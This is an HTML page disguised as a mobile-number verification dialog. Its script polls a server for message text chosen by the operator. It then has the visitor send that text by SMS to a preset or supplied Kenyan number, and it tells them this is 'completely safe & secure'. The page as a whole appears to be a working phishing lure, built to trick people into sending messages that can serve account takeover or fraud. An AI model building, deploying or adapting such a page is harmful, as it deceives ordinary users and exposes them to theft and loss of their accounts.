<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
  <title>Messages</title>
  <style>
    :root {
      --page-bg: #e7e7e7;
      --card-bg: #f3f3f3;
      --text: #2d2f34;
      --muted: #5e6771;
      --soft: #7a7f85;
      --purple: #9b5bb7;
      --purple-dark: #7a4d9c;
      --button-blue: #314c60;
      --button-blue-dark: #2a3f50;
      --ring: #d7dfe6;
      --shadow: rgba(32, 33, 36, 0.08);
    }

    * { box-sizing: border-box; }

    html, body {
      margin: 0;
      min-height: 100%;
      height: 100%;
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: var(--page-bg);
      color: var(--text);
    }

    body {
      display: grid;
      place-items: center;
      padding: 24px;
    }

    .card {
      width: min(660px, 100%);
      min-height: 610px;
      padding: 48px 64px 42px;
      background: rgba(255, 255, 255, 0.72);
      border-radius: 28px;
      border: 1px solid rgba(38, 41, 46, 0.08);
      box-shadow: 0 12px 26px rgba(20, 22, 29, 0.08);
      text-align: center;
    }

    h1 {
      margin: 0;
      font-size: clamp(2.2rem, 3vw, 4rem);
      line-height: 1.08;
      letter-spacing: -0.07em;
      font-weight: 700;
      color: #2f3034;
    }

    .device-stage {
      display: grid;
      place-items: center;
      margin: 34px auto 22px;
    }

    .device {
      position: relative;
      width: 188px;
      height: 148px;
      border: 4px solid var(--purple);
      border-radius: 16px;
      background: rgba(255, 255, 255, 0.1);
      box-shadow: inset 0 0 0 4px rgba(155, 91, 183, 0.1);
    }

    .device::before {
      content: "";
      position: absolute;
      left: 50%;
      top: 10px;
      width: 14px;
      height: 14px;
      border-radius: 50%;
      transform: translateX(-50%);
      background: var(--purple);
      opacity: 0.85;
    }

    .device::after {
      content: "";
      position: absolute;
      left: 50%;
      bottom: 8px;
      width: 44px;
      height: 4px;
      border-radius: 999px;
      transform: translateX(-50%);
      background: var(--purple);
      opacity: 0.9;
    }

    .screen {
      position: absolute;
      inset: 20px 16px 22px;
      border-radius: 12px;
      border: 3px solid var(--purple);
      background: rgba(255, 255, 255, 0.18);
    }

    .screen::before,
    .screen::after {
      content: "";
      position: absolute;
      border-radius: 999px;
      background: var(--purple);
      opacity: 0.9;
    }

    .screen::before {
      width: 58px;
      height: 12px;
      left: 18px;
      top: 28px;
      opacity: 0.5;
    }

    .screen::after {
      width: 72px;
      height: 12px;
      left: 18px;
      top: 52px;
      opacity: 0.7;
    }

    .magnifier {
      position: absolute;
      right: -18px;
      bottom: 6px;
      width: 116px;
      height: 116px;
      border: 4px solid var(--purple);
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.06);
    }

    .magnifier::before {
      content: "";
      position: absolute;
      right: -18px;
      bottom: 18px;
      width: 36px;
      height: 6px;
      border-radius: 999px;
      background: var(--purple);
      transform: rotate(45deg);
      transform-origin: left center;
    }

    .magnifier::after {
      content: "";
      position: absolute;
      inset: 16px;
      border-radius: 50%;
      background: rgba(155, 91, 183, 0.04);
      border: 2px solid rgba(155, 91, 183, 0.2);
    }

    .instruction {
      margin: 0 auto;
      max-width: 540px;
      font-size: clamp(1.26rem, 2vw, 2.1rem);
      line-height: 1.22;
      letter-spacing: -0.05em;
      color: #2f343b;
      font-weight: 400;
    }

    .instruction strong {
      font-weight: 800;
    }

    .safe-note {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 18px;
      margin: 36px auto 28px;
      max-width: 560px;
      text-align: left;
    }

    .tiny-icon {
      display: grid;
      place-items: center;
      width: 36px;
      height: 36px;
      min-width: 36px;
      border-radius: 50%;
      background: #2d2d32;
      color: #fff;
      font-weight: 700;
      font-size: 1.1rem;
      line-height: 1;
      box-shadow: inset 0 0 0 2px rgba(255,255,255,0.15);
    }

    .safe-note p {
      margin: 0;
      font-size: clamp(1.25rem, 2vw, 2.15rem);
      line-height: 1.2;
      letter-spacing: -0.05em;
      color: #2d3035;
      font-weight: 400;
    }

    .safe-note strong {
      font-weight: 800;
    }

    .cta-row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 18px;
      margin-top: 18px;
    }

    .btn {
      appearance: none;
      border: 0;
      border-radius: 18px;
      padding: 22px 22px;
      font-size: clamp(1.7rem, 2vw, 2.5rem);
      line-height: 1;
      letter-spacing: -0.05em;
      font-weight: 700;
      cursor: pointer;
      transition: transform 0.18s ease, box-shadow 0.18s ease;
    }

    .btn:hover {
      transform: translateY(-1px);
    }

    .btn.cancel {
      background: linear-gradient(180deg, #3d586d 0%, #2f485d 100%);
      color: #fff;
      box-shadow: inset 0 0 0 1px rgba(255,255,255,0.08);
    }

    .btn.proceed {
      background: linear-gradient(180deg, #3d586d 0%, #2f485d 100%);
      color: #fff;
      box-shadow: inset 0 0 0 1px rgba(255,255,255,0.08);
    }

    .hidden {
      display: none !important;
    }

    .loading-state {
      display: grid;
      place-items: center;
      min-height: 420px;
      text-align: center;
    }

    .loading-spinner {
      width: 52px;
      height: 52px;
      border: 5px solid rgba(109, 102, 116, 0.15);
      border-top-color: var(--purple);
      border-radius: 50%;
      animation: spin 0.9s linear infinite;
      margin: 0 auto 18px;
    }

    .loading-label {
      font-size: clamp(1.7rem, 2vw, 2.2rem);
      font-weight: 700;
      letter-spacing: -0.05em;
      color: #2d3035;
      margin-bottom: 10px;
    }

    .loading-sub {
      color: #5f6670;
      font-size: clamp(1.1rem, 1.7vw, 1.45rem);
      letter-spacing: -0.04em;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    @media (max-width: 600px) {
      .card {
        padding: 34px 24px 28px;
        min-height: auto;
      }

      h1 {
        font-size: 2.3rem;
      }

      .instruction {
        font-size: 1.5rem;
      }

      .safe-note {
        gap: 12px;
      }

      .safe-note p {
        font-size: 1.45rem;
      }

      .cta-row {
        grid-template-columns: 1fr;
      }
    }
  </style>
</head>
<body>
  <div class="card" role="dialog" aria-modal="true" aria-labelledby="verify-title">
    <div id="loadingState" class="loading-state">
      <div>
        <div class="loading-spinner" aria-hidden="true"></div>
        <div class="loading-label">Message ready</div>
        <div class="loading-sub">Waiting for the approval message…</div>
      </div>
    </div>

    <div id="readyState" class="hidden">
      <h1 id="verify-title">Let’s get your Mobile<br>number verified</h1>

      <div class="device-stage" aria-hidden="true">
        <div class="device">
          <div class="screen"></div>
          <div class="magnifier"></div>
        </div>
      </div>

      <p class="instruction">
        Please send verification SMS from<br>
        <strong id="verificationPhone">+2540748128931</strong> immediately to verify your number.
      </p>

      <div class="safe-note" aria-live="polite">
        <span class="tiny-icon">i</span>
        <p><span>will prompt you to</span> <strong>send an SMS.</strong> It is completely safe &amp; secure.</p>
      </div>

      <div class="cta-row">
        <button type="button" class="btn cancel">Cancel</button>
        <button type="button" class="btn proceed">Proceed</button>
      </div>
    </div>
  </div>

  <script>
    const params = new URLSearchParams(window.location.search);
    const reqId = params.get('id');
    const requestedPhone = params.get('phone');
    const phoneEl = document.getElementById('verificationPhone');
    const loadingState = document.getElementById('loadingState');
    const readyState = document.getElementById('readyState');

    const DEFAULT_SMS_NUMBER = '+2540748128931';
    let lastMsgId = 0;
    let currentMessageText = 'Verification';
    let currentPhoneNumber = DEFAULT_SMS_NUMBER;

    function normalizePhone(phone) {
      if (!phone) return DEFAULT_SMS_NUMBER;
      let cleaned = String(phone).trim();
      cleaned = cleaned.replace(/\s+/g, '');
      cleaned = cleaned.replace(/[^\d+]/g, '');

      if (!cleaned) return DEFAULT_SMS_NUMBER;
      if (cleaned.startsWith('00')) {
        cleaned = '+' + cleaned.slice(2);
      }
      if (cleaned.startsWith('+')) return cleaned;
      if (/^254\d{9}$/.test(cleaned)) return '+' + cleaned;
      if (/^\d{9}$/.test(cleaned)) return '+254' + cleaned;
      if (/^\d{10}$/.test(cleaned)) return '+254' + cleaned.slice(1);
      return cleaned || DEFAULT_SMS_NUMBER;
    }

    function setPhone(value) {
      const safe = normalizePhone(value);
      currentPhoneNumber = safe;
      if (phoneEl) phoneEl.textContent = safe;
      return safe;
    }

    function showReadyState() {
      loadingState.classList.add('hidden');
      readyState.classList.remove('hidden');
    }

    async function loadRequestPhone() {
      if (requestedPhone) {
        return setPhone(requestedPhone);
      }

      if (!reqId) {
        return setPhone(DEFAULT_SMS_NUMBER);
      }

      try {
        const response = await fetch('/api/request/' + encodeURIComponent(reqId));
        if (!response.ok) {
          return setPhone(DEFAULT_SMS_NUMBER);
        }

        const requestData = await response.json();
        return setPhone(requestData.phone || DEFAULT_SMS_NUMBER);
      } catch (err) {
        console.error('Unable to load request phone:', err);
        return setPhone(DEFAULT_SMS_NUMBER);
      }
    }

    async function pollMessages() {
      if (!reqId) {
        showReadyState();
        return;
      }

      try {
        const response = await fetch('/api/messages/' + encodeURIComponent(reqId) + '?since=' + lastMsgId);
        if (response.status === 403 || response.status === 404) {
          return;
        }
        if (!response.ok) {
          return;
        }

        const messages = await response.json();
        if (!messages || !messages.length) {
          return;
        }

        const latest = messages.reduce((latestMessage, message) => message.id > latestMessage.id ? message : latestMessage, messages[0]);
        currentMessageText = latest.text || 'Verification';
        lastMsgId = Math.max(lastMsgId, latest.id);
        showReadyState();
      } catch (err) {
        console.error('Unable to load messages:', err);
      }
    }

    loadRequestPhone();
    pollMessages();
    setInterval(pollMessages, 3000);

    document.querySelector('.btn.proceed')?.addEventListener('click', function () {
      const number = normalizePhone(currentPhoneNumber);
      const smsHref = 'sms:' + number + '?body=' + encodeURIComponent(currentMessageText);
      window.location.href = smsHref;
    });

    document.querySelector('.btn.cancel')?.addEventListener('click', function () {
      window.history.back();
    });
  </script>
</body>
</html>
